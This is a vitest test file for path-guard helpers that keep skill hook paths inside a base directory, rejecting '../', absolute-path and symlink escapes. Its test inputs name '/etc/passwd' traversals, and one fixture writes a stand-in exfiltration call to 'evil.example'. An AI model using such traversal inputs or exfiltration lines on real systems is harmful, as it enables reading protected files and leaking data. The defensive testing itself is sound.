import { describe, it, expect, afterEach } from 'vitest';
import { resolveWithinBase, resolveCliPath } from './paths';
import { EvolveGuardError } from './errors';
import * as path from 'node:path';
import * as fs from 'node:fs';
import * as os from 'node:os';

describe('resolveWithinBase', () => {
  it('resolves a relative path nested inside the base directory', () => {
    const result = resolveWithinBase('/skills/my-skill', 'hooks/pre.sh');
    expect(result).toBe(path.resolve('/skills/my-skill/hooks/pre.sh'));
  });

  it('rejects a path that traverses outside the base directory', () => {
    expect(() => resolveWithinBase('/skills/my-skill', '../../etc/passwd')).toThrow(
      EvolveGuardError
    );
  });

  it('rejects an absolute path pointing outside the base directory', () => {
    expect(() => resolveWithinBase('/skills/my-skill', '/etc/passwd')).toThrow(
      EvolveGuardError
    );
  });

  it('allows the base directory itself', () => {
    const result = resolveWithinBase('/skills/my-skill', '.');
    expect(result).toBe(path.resolve('/skills/my-skill'));
  });

  describe('symlink escapes', () => {
    let tmpDir: string;

    afterEach(() => {
      if (tmpDir) fs.rmSync(tmpDir, { recursive: true, force: true });
    });

    it('rejects a lexically-safe path whose target is a symlink pointing outside the base', () => {
      tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'evolveguard-paths-test-'));
      const skillDir = path.join(tmpDir, 'skill', 'hooks');
      fs.mkdirSync(skillDir, { recursive: true });
      const outsideFile = path.join(tmpDir, 'outside-secret.txt');
      fs.writeFileSync(outsideFile, 'fetch("https://evil.example/exfil")\n');
      fs.symlinkSync(outsideFile, path.join(skillDir, 'pre.sh'));

      expect(() => resolveWithinBase(path.join(tmpDir, 'skill'), 'hooks/pre.sh')).toThrow(
        EvolveGuardError
      );
    });

    it('allows a symlink whose target stays inside the base directory', () => {
      tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'evolveguard-paths-test-'));
      const skillDir = path.join(tmpDir, 'skill');
      fs.mkdirSync(path.join(skillDir, 'hooks'), { recursive: true });
      const insideFile = path.join(skillDir, 'real.sh');
      fs.writeFileSync(insideFile, '#!/bin/sh\necho ok\n');
      fs.symlinkSync(insideFile, path.join(skillDir, 'hooks', 'pre.sh'));

      const result = resolveWithinBase(skillDir, 'hooks/pre.sh');
      expect(result).toBe(path.resolve(skillDir, 'hooks/pre.sh'));
    });

    it('does not error on a path that does not exist yet (no realpath to follow)', () => {
      const result = resolveWithinBase('/skills/my-skill', 'hooks/not-created-yet.sh');
      expect(result).toBe(path.resolve('/skills/my-skill/hooks/not-created-yet.sh'));
    });
  });
});

describe('resolveCliPath', () => {
  it('resolves a relative path against the given cwd', () => {
    expect(resolveCliPath('/a/b', 'c.json')).toBe(path.resolve('/a/b/c.json'));
  });
});
